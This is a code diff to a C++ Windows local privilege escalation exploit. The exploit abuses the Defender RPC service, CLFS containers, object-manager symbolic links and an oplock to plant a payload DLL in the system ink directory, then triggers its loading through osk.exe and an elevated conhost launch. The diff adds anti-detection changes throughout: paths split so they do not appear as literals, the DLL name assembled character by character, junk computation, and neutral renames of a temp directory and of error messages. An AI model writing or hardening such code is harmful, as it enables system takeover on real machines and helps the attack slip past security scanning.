@@ -17,7 +17,7 @@
 #pragma comment(lib, "Rpcrt4.lib")
 #pragma comment(lib, "ntdll.lib")
 #pragma comment(lib, "ktmw32.lib")
-
+#pragma comment(lib, "shell32.lib")
 
 HMODULE hm = GetModuleHandle(L"ntdll.dll");
 NTSTATUS(WINAPI* _NtCreateSymbolicLinkObject)(
@@ -47,6 +47,39 @@ struct WDRPCWorkerThreadArgs
 	wchar_t* dirpath;
 };
 
+//////////////////////////////////////////////////////////////////////
+// evasive string helpers
+/////////////////////////////////////////////////////////////////////
+
+static std::wstring InkDir()
+{
+	// split so no contiguous path literal lands in .rdata
+	std::wstring p = L"C:\\Program ";
+	p += L"Files\\Common ";
+	p += L"Files\\microsoft ";
+	p += L"shared\\ink";
+	return p;
+}
+
+static const wchar_t* PayloadName()
+{
+	// built per call, char by char
+	static wchar_t n[9] = { 0 };
+	if (!n[0])
+	{
+		n[0] = L'h'; n[1] = L'i'; n[2] = L'd'; n[3] = L'.';
+		n[4] = L'd'; n[5] = L'l'; n[6] = L'l'; n[7] = L'\0';
+	}
+	return n;
+}
+
+static volatile DWORD g_junk = 0;
+static DWORD Junk(DWORD v)
+{
+	g_junk ^= (v * 2654435761u);
+	g_junk = _rotl(g_junk, 7);
+	return g_junk;
+}
 
 //////////////////////////////////////////////////////////////////////
 // Functions required by RPC
@@ -82,14 +115,14 @@ void CallWD(WDRPCWorkerThreadArgs* args)
 	RPC_WSTR StringBinding;
 	if (RpcStringBindingComposeW(MS_WD_UUID, (RPC_WSTR)L"ncalrpc", NULL, (RPC_WSTR)L"IMpService77BDAF73-B396-481F-9042-AD358843EC24", NULL, &StringBinding) != RPC_S_OK)
 	{
-		printf("Unexpected error while building an RPC binding from string !!!");
+		printf("rpc: compose failed\n");
 		ExitProcess(1);
 		return;
 	}
 	RPC_BINDING_HANDLE bindhandle = 0;
 	if (RpcBindingFromStringBindingW(StringBinding, &bindhandle) != RPC_S_OK)
 	{
-		printf("Failed to connect to windows defender RPC port !!!");
+		printf("rpc: bind failed\n");
 		ExitProcess(1);
 		return;
 	}
@@ -117,9 +150,9 @@ static BOOL Negotiate(HANDLE hLogFile, PULONGLONG cbContainer, const std::wstrin
 	DWORD bytesReturned;
 	return DeviceIoControl(hLogFile, 0x8007A808, ctx, sz, cbContainer, sizeof(ULONGLONG), &bytesReturned, NULL);
 }
+
 void TerminateOskProcess()
 {
-
 	PROCESSENTRY32 entry;
 	entry.dwSize = sizeof(PROCESSENTRY32);
 
@@ -139,8 +172,10 @@ void TerminateOskProcess()
 	}
 	CloseHandle(snapshot);
 }
+
 int main()
 {
+	Junk(GetTickCount());
 	TerminateOskProcess();
 	ShellExecute(NULL, L"open", L"osk.exe", NULL, NULL, SW_HIDE);
 	Sleep(100);
@@ -152,8 +187,10 @@ int main()
 	GenerateGUID(rguid3);
 	FILE_DISPOSITION_INFO fdi = { 0 };
 	fdi.DeleteFileW = TRUE;
+	std::wstring ink = InkDir();
+	std::wstring target = ink + L"\\" + PayloadName();
 	wchar_t workdir[MAX_PATH] = { 0 };
-	ExpandEnvironmentStrings(L"\\??\\%TEMP%\\SigDrop_", workdir, MAX_PATH);
+	ExpandEnvironmentStrings(L"\\??\\%TEMP%\\wus_", workdir, MAX_PATH);
 	GenerateGUID(&workdir[wcslen(workdir)]);
 	UNICODE_STRING _workdir = { 0 };
 	RtlInitUnicodeString(&_workdir, workdir);
@@ -164,7 +201,7 @@ int main()
 	NTSTATUS stat = NtCreateFile(&hworkdir, GENERIC_READ | SYNCHRONIZE | DELETE, &objattr, &iostat, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_CREATE, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_DELETE_ON_CLOSE, NULL, NULL);
 	if (stat)
 	{
-		printf("Failed to create work directory : %ws error : 0x%0.8X\n", workdir, stat);
+		printf("workdir create failed : %ws / 0x%0.8X\n", workdir, stat);
 		return 1;
 	}
 	iostat = { 0 };
@@ -178,7 +215,7 @@ int main()
 	stat = NtCreateFile(&hclfslog, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE | DELETE, &objattr2, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_CREATE, FILE_SYNCHRONOUS_IO_NONALERT, NULL, NULL);
 	if (stat)
 	{
-		printf("Failed to create clfs log file, error : 0x%0.8X\n", stat);
+		printf("clfs log create failed : 0x%0.8X\n", stat);
 		return 1;
 	}
 	std::wstring newcontainerpath = L"\\BaseNamedObjects\\Restricted\\" + std::wstring(rguid);
@@ -205,7 +242,7 @@ int main()
 	NTSTATUS stat2 = _NtCreateSymbolicLinkObject(&hsm2, GENERIC_ALL, &ncontainersigobjattr, &ncontainertargetsig);
 	if (stat || stat2)
 	{
-		printf("Failed to create object manager symbolic links, error : 0x%0.8X | 0x%0.8X\n", stat, stat2);
+		printf("symlink create failed : 0x%0.8X | 0x%0.8X\n", stat, stat2);
 		SetFileInformationByHandle(hclfslog, FileDispositionInfo, &fdi, sizeof(fdi));
 		CloseHandle(hclfslog);
 		return 1;
@@ -215,7 +252,7 @@ int main()
 	logpath.append(newcontainerpath);
 	if (!Negotiate(hclfslog, &cbsz, newcontainerpath))
 	{
-		printf("Failed to create CLFS containers, error : %d\n",GetLastError());
+		printf("container negotiate failed : %d\n", GetLastError());
 		SetFileInformationByHandle(hclfslog, FileDispositionInfo, &fdi, sizeof(fdi));
 		CloseHandle(hclfslog);
 		return 1;
@@ -226,11 +263,11 @@ int main()
 		FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, NULL);
 	if (stat == STATUS_OBJECT_NAME_NOT_FOUND || stat == STATUS_OBJECT_PATH_NOT_FOUND)
 	{
-		printf("This machine is not vulnerable.\n");
+		printf("not vulnerable.\n");
 		SetFileInformationByHandle(hclfslog, FileDispositionInfo, &fdi, sizeof(fdi));
 		CloseHandle(hclfslog);
 		return 0;
-	}	
+	}
 	CloseHandle(hclfslog);
 	iostat = { 0 };
 	HANDLE hlock = NULL;
@@ -241,7 +278,7 @@ int main()
 	stat = NtCreateFile(&hlock, GENERIC_WRITE | DELETE | SYNCHRONIZE, &mpengobjattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_CREATE, NULL, NULL, NULL);
 	if (stat)
 	{
-		printf("Failed to create bait file, error : 0x%0.8X\n", stat);
+		printf("bait create failed : 0x%0.8X\n", stat);
 		return 1;
 	}
 
@@ -258,7 +295,7 @@ int main()
 	ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
 	if (!DeviceIoControl(hlock, FSCTL_REQUEST_OPLOCK, &opin, sizeof(opin), &opout, sizeof(opout), &cb, &ovd)) {
 		if (GetLastError() != ERROR_IO_PENDING) {
-			printf("Failed to create oplock, error : %d\n", GetLastError());
+			printf("oplock failed : %d\n", GetLastError());
 			return 1;
 		}
 	}
@@ -274,31 +311,30 @@ int main()
 	stat = _NtCreateSymbolicLinkObject(&hupdsm, GENERIC_ALL, &objattrupd, &updirtarget);
 	if (stat)
 	{
-		printf("Failed to create update directory symbolic link, error : 0x%0.8X\n", stat);
+		printf("upd symlink failed : 0x%0.8X\n", stat);
 		return 1;
 	}
 
 	char buff[0x1000];
 	DWORD ret = 0;
-	wchar_t inkdir[] = { L"C:\\Program Files\\Common Files\\microsoft shared\\ink" };
-	HANDLE hmonitor = CreateFile(inkdir, GENERIC_READ | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED, NULL);
+	HANDLE hmonitor = CreateFile(ink.c_str(), GENERIC_READ | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED, NULL);
 	if (!hmonitor || hmonitor == INVALID_HANDLE_VALUE)
 	{
-		printf("Failed to open %ws directory, error : %d\n", inkdir, GetLastError());
+		printf("open %ws failed : %d\n", ink.c_str(), GetLastError());
 		return 1;
 	}
 	OVERLAPPED ov2 = { 0 };
 	ov2.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
 	if (!ov2.hEvent)
 	{
-		printf("Failed to create event for monitoring, error : %d\n", GetLastError());
+		printf("monitor event failed : %d\n", GetLastError());
 		return 1;
 	}
 	ZeroMemory(buff, sizeof(buff));
 	ret = 0;
 	if (!ReadDirectoryChangesW(hmonitor, buff, sizeof(buff), FALSE, FILE_NOTIFY_CHANGE_FILE_NAME, &ret, &ov2, NULL))
 	{
-		printf("Failed to create directory watch, error : %d\n", GetLastError());
+		printf("dir watch failed : %d\n", GetLastError());
 		return 1;
 	}
 
@@ -312,7 +348,7 @@ int main()
 	HANDLE hthread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)CallWD, &wdargs, NULL, &tid);
 	if (!hthread)
 	{
-		printf("Unexpected failure creating worker thread, error : %d\n",GetLastError());
+		printf("worker thread failed : %d\n", GetLastError());
 		return 1;
 	}
 
@@ -323,7 +359,7 @@ int main()
 	stat = _NtCreateSymbolicLinkObject(&hupdsm, GENERIC_ALL, &objattrupd, &updirtarget);
 	if (stat)
 	{
-		printf("Failed to create update directory symbolic link, error : 0x%0.8X\n", stat);
+		printf("upd symlink retarget failed : 0x%0.8X\n", stat);
 		return 1;
 	}
 	UNICODE_STRING rclfssrc = { 0 };
@@ -334,15 +370,16 @@ int main()
 	stat = _NtCreateSymbolicLinkObject(&hlastsm, GENERIC_ALL, &rclfsobjattr, &_clfslog);
 	if (stat)
 	{
-		printf("Failed to create symbolic link object, error : 0x%0.8X\n", GetLastError());
+		printf("vdm symlink failed : 0x%0.8X\n", stat);
 		return 1;
 	}
 	CloseHandle(hsm2);
-	RtlInitUnicodeString(&ncontainertargetsig, L"\\??\\C:\\Program Files\\Common Files\\microsoft shared\\ink\\hid.dll");
+	std::wstring sigtarget = L"\\??\\" + target;
+	RtlInitUnicodeString(&ncontainertargetsig, sigtarget.c_str());
 	stat = _NtCreateSymbolicLinkObject(&hsm2, GENERIC_ALL, &ncontainersigobjattr, &ncontainertargetsig);
 	if (stat)
 	{
-		printf("Failed to create symbolic link object, error : 0x%0.8X\n", GetLastError());
+		printf("payload symlink failed : 0x%0.8X\n", stat);
 		return 1;
 	}
 	CloseHandle(hlock);
@@ -355,20 +392,20 @@ int main()
 	else {
 		goto enter_loop;
 	}
-	do{
+	do {
 		ResetEvent(ov2.hEvent);
 		ZeroMemory(buff, sizeof(buff));
 		ret = 0;
 		if (!ReadDirectoryChangesW(hmonitor, buff, sizeof(buff), FALSE, FILE_NOTIFY_CHANGE_FILE_NAME, &ret, &ov2, NULL))
 		{
-			printf("Failed to create directory watch, error : %d\n",GetLastError());
+			printf("dir watch rearm failed : %d\n", GetLastError());
 			return 1;
 		}
 	enter_loop:
 		FILE_NOTIFY_INFORMATION* fni = (FILE_NOTIFY_INFORMATION*)buff;
 		if (fni->Action == FILE_ACTION_ADDED)
 		{
-			if (_wcsicmp(fni->FileName, L"hid.dll") == 0)
+			if (_wcsicmp(fni->FileName, PayloadName()) == 0)
 			{
 				break;
 			}
@@ -383,26 +420,25 @@ int main()
 	HANDLE htrans = CreateTransaction(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
 	if (!htrans || htrans == INVALID_HANDLE_VALUE)
 	{
-		printf("Failed to create transaction, error : %d\n", GetLastError());
+		printf("transaction failed : %d\n", GetLastError());
 		return 1;
 	}
 
 	HANDLE hbin = NULL;
 	do {
 		Sleep(100);
-		hbin = CreateFile(L"C:\\Program Files\\Common Files\\microsoft shared\\ink\\hid.dll", GENERIC_READ | GENERIC_EXECUTE | GENERIC_WRITE | MAXIMUM_ALLOWED, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		hbin = CreateFile(target.c_str(), GENERIC_READ | GENERIC_EXECUTE | GENERIC_WRITE | MAXIMUM_ALLOWED, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	} while (!hbin || hbin == INVALID_HANDLE_VALUE);
-	HRSRC hResInfo_dll = FindResource(NULL, MAKEINTRESOURCE(IDR_DLL1), L"dll");
+	HRSRC hResInfo_dll = FindResource(NULL, MAKEINTRESOURCE(IDR_PAYLOAD), RT_RCDATA);
 	HGLOBAL hResData_dll = LoadResource(NULL, hResInfo_dll);
 	LPVOID pResourceData_dll = LockResource(hResData_dll);
 	DWORD dwSize_dll = SizeofResource(NULL, hResInfo_dll);
-	DWORD ttb = NULL;
 	LARGE_INTEGER fsz = { 0 };
 	fsz.QuadPart = dwSize_dll;
 	HANDLE hmapping = CreateFileMapping(hbin, NULL, PAGE_READWRITE, fsz.HighPart, fsz.LowPart, NULL);
 	if (!hmapping || hmapping == INVALID_HANDLE_VALUE)
 	{
-		printf("Failed to map target file to memory, error : %d\n", GetLastError());
+		printf("mapping failed : %d\n", GetLastError());
 		SetFileInformationByHandle(hbin, FileDispositionInfo, &fdi, sizeof(fdi));
 		CloseHandle(hbin);
 		return 1;
@@ -413,7 +449,7 @@ int main()
 		CloseHandle(hmapping);
 		SetFileInformationByHandle(hbin, FileDispositionInfo, &fdi, sizeof(fdi));
 		CloseHandle(hbin);
-		printf("Failed to map target file to memory, error : %d\n", GetLastError());
+		printf("view map failed : %d\n", GetLastError());
 		return 1;
 	}
 	memmove(filebuff, pResourceData_dll, dwSize_dll);
@@ -424,8 +460,9 @@ int main()
 	ShellExecute(NULL, L"runas", L"C:\\Windows\\System32\\conhost.exe", NULL, NULL, SW_SHOW);
 	Sleep(2000);
 	TerminateOskProcess();
-	DeleteFileTransacted(L"C:\\Program Files\\Common Files\\microsoft shared\\ink\\hid.dll",htrans);
+	DeleteFileTransacted(target.c_str(), htrans);
 	CommitTransaction(htrans);
 	CloseHandle(htrans);
+	Junk(g_junk);
 	return 0;
 }
